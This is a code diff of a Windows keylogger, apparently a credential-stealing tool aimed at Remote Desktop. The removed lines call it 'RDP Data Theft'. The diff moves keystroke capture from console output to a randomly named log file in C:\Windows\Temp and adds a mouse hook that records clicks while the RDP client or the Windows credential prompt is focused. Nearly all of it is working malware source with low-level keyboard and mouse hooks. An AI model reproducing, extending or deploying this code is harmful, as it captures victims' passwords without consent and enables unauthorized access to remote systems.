@@ -1,7 +1,12 @@
 #include <windows.h>
 #include <tlhelp32.h>
 #include <stdio.h>
+#include <string>
+#include <ctime>
+#include <iostream>
 
+
+wchar_t filename[80];
 
 DWORD GetProcId(const wchar_t* procName) {
     DWORD procId = 0;
@@ -52,6 +57,53 @@ BOOL isWindowOfProcessFocused(const wchar_t* processName) {
     return TRUE;
 }
 
+void WriteToFile(char* data)
+{
+    HANDLE hFile;
+    DWORD dwBytesToWrite = (DWORD)strlen(data);
+    DWORD dwBytesWritten;
+    BOOL bErrorFlag = FALSE;
+
+    hFile = CreateFileW(filename,  // name of the write
+        FILE_APPEND_DATA,          // open for appending
+        FILE_SHARE_READ,           // share for reading only
+        NULL,                      // default security
+        OPEN_ALWAYS,               // open existing file or create new file 
+        FILE_ATTRIBUTE_NORMAL,     // normal file
+        NULL);                     // no attr. template
+
+    if (hFile == INVALID_HANDLE_VALUE)
+    {
+        //DisplayError(TEXT("CreateFile"));
+        wprintf(L"Terminal failure: Unable to create/open file \"%s\" for writing.\n", filename);
+        return;
+    }
+
+    while (dwBytesToWrite > 0)
+    {
+        bErrorFlag = WriteFile(
+            hFile,              // open file handle
+            data,               // start of data to write
+            dwBytesToWrite,     // number of bytes to write
+            &dwBytesWritten,    // number of bytes that were written
+            NULL);              // no overlapped structure
+
+        if (!bErrorFlag)
+        {
+            //DisplayError(TEXT("WriteFile"));
+            printf("Terminal failure: Unable to write to file.\n");
+            break;
+        }
+
+        wprintf(L"Wrote %u bytes to \"%s\" successfully.\n", dwBytesWritten, filename);
+
+        data += dwBytesWritten;
+        dwBytesToWrite -= dwBytesWritten;
+    }
+
+    CloseHandle(hFile);
+}
+
 
 LRESULT CALLBACK KbdHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode >= 0) {
@@ -70,33 +122,35 @@ LRESULT CALLBACK KbdHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
                     return CallNextHookEx(NULL, nCode, wParam, lParam);
                 }
 
+                
                 if (prev == 0xA2 && vkCode == 0xA5) { // RALT
-                    printf("<RALT>");
+                    WriteToFile((char*)"<ALT>");
                     isLetter = 0;
                 }
                 else if (prev == 0xA2 && vkCode != 0xA5) {
-                    printf("<LCTRL>");
+                    WriteToFile((char*)"<CTRL>");
                 }
 
                 BOOL shiftPressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
 
                 switch (vkCode) {
-                case 0xA3: printf("<RCTRL>"); isLetter = 0; break;
-                case 0xA4: printf("<LALT>"); isLetter = 0; break;
-                case VK_CAPITAL: printf("<CAPSLOCK>"); isLetter = 0; break;
-                case 0x08: printf("<ESC>"); isLetter = 0; break;
-                case 0x0D: putchar('\n'); isLetter = 0; break;
-                case VK_OEM_PLUS: shiftPressed ? printf("+") : printf("="); isLetter = 0; break;
-                case VK_OEM_COMMA: shiftPressed ? printf("<") : printf(","); isLetter = 0; break;
-                case VK_OEM_MINUS: shiftPressed ? printf("_") : printf("-"); isLetter = 0; break;
-                case VK_OEM_PERIOD: shiftPressed ? printf(">") : printf("."); isLetter = 0; break;
-                case VK_OEM_1: shiftPressed ? printf(":") : printf(";"); isLetter = 0; break;
-                case VK_OEM_2: shiftPressed ? printf("?") : printf("/"); isLetter = 0; break;
-                case VK_OEM_3: shiftPressed ? printf("~") : printf("`"); isLetter = 0; break;
-                case VK_OEM_4: shiftPressed ? printf("{") : printf("["); isLetter = 0; break;
-                case VK_OEM_5: shiftPressed ? printf("|") : printf("\\"); isLetter = 0; break;
-                case VK_OEM_6: shiftPressed ? printf("}") : printf("]"); isLetter = 0; break;
-                case VK_OEM_7: shiftPressed ? printf("\"") : printf("'"); isLetter = 0; break;
+                case VK_TAB: WriteToFile((char*)"<TAB>"); isLetter = 0; break;
+                case 0xA3: WriteToFile((char*)"<RCTRL>"); isLetter = 0; break;
+                case 0xA4: WriteToFile((char*)"<LALT>"); isLetter = 0; break;
+                case VK_CAPITAL: WriteToFile((char*)"<CAPSLOCK>"); isLetter = 0; break;
+                case 0x08: WriteToFile((char*)"<ESC>"); isLetter = 0; break;
+                case 0x0D: WriteToFile((char*)"\n"); isLetter = 0; break;
+                case VK_OEM_PLUS: shiftPressed ? WriteToFile((char*)"+") : WriteToFile((char*)"="); isLetter = 0; break;
+                case VK_OEM_COMMA: shiftPressed ? WriteToFile((char*)"<") : WriteToFile((char*)","); isLetter = 0; break;
+                case VK_OEM_MINUS: shiftPressed ? WriteToFile((char*)"_") : WriteToFile((char*)"-"); isLetter = 0; break;
+                case VK_OEM_PERIOD: shiftPressed ? WriteToFile((char*)">") : WriteToFile((char*)"."); isLetter = 0; break;
+                case VK_OEM_1: shiftPressed ? WriteToFile((char*)":") : WriteToFile((char*)";"); isLetter = 0; break;
+                case VK_OEM_2: shiftPressed ? WriteToFile((char*)"?") : WriteToFile((char*)"/"); isLetter = 0; break;
+                case VK_OEM_3: shiftPressed ? WriteToFile((char*)"~") : WriteToFile((char*)"`"); isLetter = 0; break;
+                case VK_OEM_4: shiftPressed ? WriteToFile((char*)"{") : WriteToFile((char*)"["); isLetter = 0; break;
+                case VK_OEM_5: shiftPressed ? WriteToFile((char*)"|") : WriteToFile((char*)"\\"); isLetter = 0; break;
+                case VK_OEM_6: shiftPressed ? WriteToFile((char*)"}") : WriteToFile((char*)"]"); isLetter = 0; break;
+                case VK_OEM_7: shiftPressed ? WriteToFile((char*)"\"") : WriteToFile((char*)"'"); isLetter = 0; break;
                 default: break;
                 }
 
@@ -105,38 +159,48 @@ LRESULT CALLBACK KbdHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
                     BOOL capsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
                     if (vkCode >= 0x41 && vkCode <= 0x5A) {
                         if (capsLock ^ shiftPressed) { // XOR operation, to check if exactly one of them is TRUE
-                            printf("%c", vkCode);
+							char temp[2];
+                            sprintf_s(temp, 2, "%c", vkCode);
+							WriteToFile((char*) temp);
                         }
                         else {
-                            printf("%c", vkCode + 0x20); // Convert to lowercase
+							char temp[2];
+                            sprintf_s(temp, 2, "%c", vkCode + 0x20); // Convert to lowercase
+							WriteToFile((char*) temp);
                         }
                     }
                     else if (vkCode >= 0x61 && vkCode <= 0x7A) {
                         if (capsLock ^ shiftPressed) {
-                            printf("%c", vkCode - 0x20); // Convert to uppercase
+							char temp[2];
+                            sprintf_s(temp, 2, "%c", vkCode - 0x20); // Convert to uppercase
+							WriteToFile((char*) temp);
                         }
                         else {
-                            printf("%c", vkCode);
+							char temp[2];
+                            sprintf_s(temp, 2, "%c", vkCode);
+							WriteToFile((char*) temp);
                         }
                     }
                     else if (vkCode >= 0x30 && vkCode <= 0x39) { // Check if key is a number key
                         if (shiftPressed) {
                             switch (vkCode) {
-                            case '1': printf("!"); break;
-                            case '2': printf("@"); break;
-                            case '3': printf("#"); break;
-                            case '4': printf("$"); break;
-                            case '5': printf("%"); break;
-                            case '6': printf("^"); break;
-                            case '7': printf("&"); break;
-                            case '8': printf("*"); break;
-                            case '9': printf("("); break;
-                            case '0': printf(")"); break;
+                            case '1': WriteToFile((char*)"!"); break;
+                            case '2': WriteToFile((char*)"@"); break;
+                            case '3': WriteToFile((char*)"#"); break;
+                            case '4': WriteToFile((char*)"$"); break;
+                            case '5': WriteToFile((char*)"%"); break;
+                            case '6': WriteToFile((char*)"^"); break;
+                            case '7': WriteToFile((char*)"&"); break;
+                            case '8': WriteToFile((char*)"*"); break;
+                            case '9': WriteToFile((char*)"("); break;
+                            case '0': WriteToFile((char*)")"); break;
                             default: break;
                             }
                         }
                         else {
-                            printf("%c", vkCode);
+							char temp[2];
+                            sprintf_s(temp, 2, "%c", vkCode);
+							WriteToFile((char*) temp);
                         }
                     }
                 }
@@ -157,11 +221,66 @@ LRESULT CALLBACK KbdHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
 }
 
+
+LRESULT CALLBACK MouseHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    if (nCode >= 0) {
+
+        if (isWindowOfProcessFocused(L"mstsc.exe") || isWindowOfProcessFocused(L"CredentialUIBroker.exe")) {
+
+            if (nCode == HC_ACTION && (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN)) {
+				
+				if(wParam == WM_LBUTTONDOWN) {
+					WriteToFile((char*) "<LEFT_CLICK>");
+				}
+				
+				else if(wParam == WM_RBUTTONDOWN) {
+					WriteToFile((char*) "<RIGHT_CLICK>");
+				}
+
+            }
+
+        }
+        else
+        {
+            // When the active window is not related to the specified processes, don't log.
+            return CallNextHookEx(NULL, nCode, wParam, lParam);
+        }
+
+
+    }
+
+    return CallNextHookEx(NULL, nCode, wParam, lParam);
+
+}
+
+
+
+std::string gen_random(const int len) {
+    static const char alphanum[] =
+        "0123456789"
+        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+        "abcdefghijklmnopqrstuvwxyz";
+    std::string tmp_s;
+    tmp_s.reserve(len);
+
+    for (int i = 0; i < len; ++i) {
+        tmp_s += alphanum[rand() % (sizeof(alphanum) - 1)];
+    }
+
+    return tmp_s;
+}
+
+
+
+
 int main(void) {
+    srand((unsigned)time(NULL) * GetProcessId(GetCurrentProcess())); 
+    std::string ran = gen_random(12).c_str();
+    swprintf_s(filename, 80, L"C:\\Windows\\Temp\\found_keys_%s.txt", std::wstring(ran.begin(), ran.end()).c_str());
     
-    printf("\n\n[+] Starting RDP Data Theft\n");
-    printf("[+] Waiting for RDP related processes\n\n");
+    printf("Results: %ls\n", filename);
     HHOOK kbdHook = SetWindowsHookEx(WH_KEYBOARD_LL, KbdHookProc, 0, 0);
+    HHOOK mouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseHookProc, 0, 0);
 
     while (true) {
           
@@ -173,6 +292,7 @@ int main(void) {
             }
     }
 
+    UnhookWindowsHookEx(mouseHook);
     UnhookWindowsHookEx(kbdHook);
 
     return 0;
